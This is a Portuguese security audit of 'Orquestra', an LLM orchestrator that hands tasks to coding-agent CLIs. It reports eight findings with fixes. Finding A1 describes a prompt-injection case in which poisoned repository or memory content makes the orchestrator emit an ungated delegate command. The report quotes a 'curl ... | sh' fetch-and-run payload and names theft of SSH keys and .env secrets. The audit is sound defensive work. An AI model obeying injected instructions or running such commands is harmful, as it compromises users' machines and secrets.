# Análise ponta a ponta + testes de segurança — Orquestra

**Data:** 2026-09-08
**Escopo:** `orquestra.py` (4475 l), `orquestra_tui.py` (2514 l), `orchestrator_brain.py` (181 l), `vault.py` (422 l), `test_orquestra.py`
**Ambiente:** Python 3.14.6, Kali Linux, branch `master` (com 4 arquivos modificados não commitados — refactor de resolução modelo→motor, sem impacto de segurança)

---

## 1. Está funcionando? (sim, com 1 ressalva de CI)

| Verificação | Resultado |
|---|---|
| `py_compile` de todos os módulos | ✅ OK |
| Suíte oficial `python3 test_orquestra.py` | ✅ Todos passaram (_resolve_worker, load_config, migração, git_diff, orchestrator_react, path safety…) |
| Auto-teste `python3 vault.py` | ✅ Todos passaram (persistência, senha errada, handle_command) |
| Dependências core (`rich`, `prompt_toolkit`, `cryptography 47`, `textual 8.2`) | ✅ Presentes |
| Arquitetura TUI → cérebro (chat puro) → operários com gate de aprovação | ✅ Coerente |

**Ressalva:** `python3 -m pytest` retorna **"no tests ran"**. `test_orquestra.py` usa um runner
próprio (`check()` + `if __name__ == "__main__"`), sem funções `test_*`. Quem rodar o comando
óbvio de CI vê verde com **zero teste executado**. → adotar `assert` + funções `test_*`, ou um
`conftest`/wrapper que falhe o processo.

---

## 2. Pontos fortes de segurança (o que está certo)

- **Sem `shell=True`, sem `os.system`, sem `eval`/`exec`/`pickle`/`yaml.load`** em nenhum módulo.
- **Todo `subprocess` usa argv em lista** — sem injeção de shell mesmo com prompt/modelo controlados por terceiros.
- **SQL parametrizado** (`?`); o único DDL com f-string (`ALTER TABLE … ADD COLUMN {col_def}`) itera uma tupla hardcoded.
- **Defesa de path traversal presente e testada**: `_mostrar_resolve_path`, `_bridge_path_ok`, resolvedor da árvore — `realpath` + checagem de prefixo; `../` e absoluto disfarçado são rejeitados (coberto por teste).
- **Cripto do cofre sólida**: Fernet (AES-128-CBC + HMAC-SHA256), PBKDF2-SHA256 600k iterações, salt aleatório de 16 bytes, cifra autenticada.
- **Segredos fora do `~/.orquestra.json`** — `ollama_api_key` em texto puro é removido ativamente no `load_config`. Credenciais só no cofre cifrado ou em env files externos.
- **Bridge HTTP**: escuta só em `127.0.0.1`, POST exige token aleatório de 16 bytes por processo (em memória).
- **`.gitignore`** cobre vault, salt, logs e previews.
- **Operações git destrutivas no REPL** têm guarda contra apagar trabalho não relacionado (`pre_snapshot`, `other_pending`).

---

## 3. Achados

> **Atualização 08/09/2026 — A1 e A2 corrigidos.** Ver `CHANGELOG.md` e
> `APRENDIZADOS.md` ("análise de segurança ponta a ponta"). Resumo:
> - **A1:** `ui.confirm_delegates` (nasce ligado) + barra ▶ Rodar agora / ✋ Cancelar
>   pra todo `<DELEGATE>` fora de um `<PLANO>` aprovado. Toggle `/auto on|off`.
> - **A2:** `revert_pending(only=...)` — a rejeição reverte só os arquivos da
>   tarefa; edição manual e outras tarefas aparecem como 🛡️ Preservado.

### 🔴 A1 — Injeção de prompt → execução autônoma via `<DELEGATE>` sem gate  ✅ CORRIGIDO
**Severidade: Alta** (para o modelo de ameaça "apontar o Orquestra a um repo não confiável")

A saída do LLM Orquestrador é parseada por `DELEGATE_RE` / `PIPELINE_RE` e **executada na hora**,
sem aprovação do usuário (`orquestra_tui.py:1614-1626`). Só um `<PLANO>` **sozinho** tem gate
(`:1606`). Os operários rodam **sem sandbox**:
`--dangerously-skip-permissions` (agy), `--permission-mode bypassPermissions` (claude),
`--sandbox workspace-write` (codex), `--auto` (opencode) — `orquestra.py:3333-3406`.

O contexto do Orquestrador inclui a **árvore de arquivos do projeto** e os **fatos de memória
de longo prazo** (`build_orchestrator_prompt`, `:2850`). Conteúdo envenenado (um `README`, um
comentário, uma entrada de memória) pode induzir `<DELEGATE binary="claude">curl http://x/s.sh | sh</DELEGATE>`.

O backstop é a barra **✅ Aprovar** pós-execução — mas ela só aparece **quando o operário mexe
em arquivos** (`orquestra_tui.py:1859`, `:1907` cai direto em `_re_enable_input`). Um delegate
que só **roda comandos**, **lê segredos** (`~/.ssh/id_rsa`, `.env`) ou **exfiltra dados** termina
**sem nenhum gate**. `risk_gates` nasce desligado, então o auto-approve não está em jogo — o
problema é a ausência total de gate para delegate sem diff.

**Correção sugerida:** dar ao `<DELEGATE>`/`<PIPELINE>` avulso o mesmo gate do `<PLANO>`
(mostrar o que vai rodar, esperar "Executar"), ao menos na 1ª vez por sessão; ou rodar operário
não confiável com sandbox de leitura por padrão e escalar sob confirmação.

---

### 🟠 A2 — "❌ Rejeitar" na TUI pode destruir trabalho não commitado não relacionado  ✅ CORRIGIDO
**Severidade: Média** (perda de dados)

`_handle_approval("reject")` chama `orquestra.revert_pending()` (`orquestra_tui.py:975`), que roda
`git checkout HEAD -- <todos os tracked sujos>` + `git clean -fd -- <todos os untracked>`
(`orquestra.py:799-802`) sobre **todo arquivo sujo não-ruído do repo** — não só os da tarefa
rejeitada.

O caminho REPL protege exatamente contra isso (`orquestra.py:3919-3940`: recusa o reset se havia
arquivos modificados **antes** da tarefa, ou outras tarefas pendentes). A **TUI — interface
oficial — não tem essa guarda.** Edição manual do usuário no painel Editor + delegação na mesma
sessão = a rejeição reverte as duas coisas silenciosamente. Há um `_warn_pending_manual_edits`
*antes* de rodar, mas nada impede o `revert_pending` depois.

**Correção sugerida:** portar a guarda `pre_snapshot`/`other_pending` do REPL para o
`_handle_approval`, ou fazer `revert_pending` receber a lista explícita de arquivos da tarefa.

---

### 🟠 A3 — Arquivos do cofre com permissão 0664 (world-readable)
**Severidade: Média** (ferramenta de segurança, potencialmente em host multiusuário)

`_save_vault_data` / `setup_wizard` gravam `.orquestra_vault` e `.orquestra_salt` com o umask
padrão → **0664** (verificado). Qualquer usuário local lê cifra + salt e faz brute-force offline
da senha mestra. Agrava: **mínimo de 6 caracteres** e **1× PBKDF2-SHA256** (600k é razoável, mas
não é Argon2/scrypt).

**Correção sugerida:** `os.chmod(path, 0o600)` logo após gravar vault e salt; elevar o mínimo
da senha para ~12; considerar `scrypt`/`argon2`.

---

### 🟡 A4 — `/senha-mestra` ignora a validação de força de senha
**Severidade: Baixa**

`setup_wizard` exige ≥6 caracteres. `handle_command("/senha-mestra x")` (`vault.py:287-299`)
aceita qualquer string não vazia — inclusive 1 caractere. Reusar a validação nos dois caminhos.

---

### 🟡 A5 — Prompt completo passa como argv de subprocesso
**Severidade: Baixa** (single-user), relevante em host compartilhado

`brain -p "<prompt>"`, `claude -p`, `codex exec "<papel+instrução>"`, `agy -p` — o prompt
(system + histórico da conversa + árvore de arquivos + fatos de memória) fica visível em
`ps aux` / `/proc/<pid>/cmdline` durante a chamada. Passar via `stdin` onde a CLI suportar.

---

### 🟡 A6 — Egresso de dados para LLM de terceiro por padrão
**Severidade: Baixa / informativo**

O cérebro do Orquestrador usa **DeepSeek (`api.deepseek.com`) por padrão**
(`orchestrator_brain.py:126`). A cada turno vão árvore de arquivos + conversa + fatos de memória.
É documentado, mas vale um aviso explícito de privacidade no README/primeiro uso.
`~/.orquestra_chats/*.json` guarda a conversa em texto puro, sem `chmod`.

---

### 🟡 A7 — Bridge HTTP: pequenas folgas
**Severidade: Baixa / aceitável**

- `do_GET` responde `Orquestra Bridge Active` sem token — fingerprint desnecessário.
- Handler de erro devolve `str(e)` no corpo HTTP 500 — vazamento menor de detalhe interno.
- `_bridge_path_ok` aceita **todo o `$HOME`** + tempdir (só habilita "abrir arquivo no Cursor",
  impacto baixo, mas mais largo que o necessário).

---

### 🟡 A8 — `_load_vault_data` engole `Exception` e retorna `None`
**Severidade: Baixa / robustez**

`except (InvalidToken, Exception): return None` (`vault.py:75-76`) — JSON corrompido fica
indistinguível de senha errada ("Senha incorreta. 2 tentativas restantes"), mascarando corrupção
real do cofre.

---

## 4. Prioridade recomendada

1. **A1** — fechar o gate do `<DELEGATE>` avulso (ou sandbox de leitura por padrão).
2. **A2** — portar a guarda de `pre_snapshot` para a rejeição na TUI.
3. **A3** — `chmod 0600` no vault/salt + senha mestra mais longa.
4. **A4, A8** — correções rápidas de higiene no `vault.py`.
5. **A5, A6, A7** — hardening incremental / documentação.

Nenhum achado é injeção de shell, RCE por parsing, ou SQLi — a base está limpa nesses vetores.
O risco real do projeto é **o modelo de confiança do fluxo Orquestrador→Operário** (A1) e
**perda de dados na rejeição** (A2).
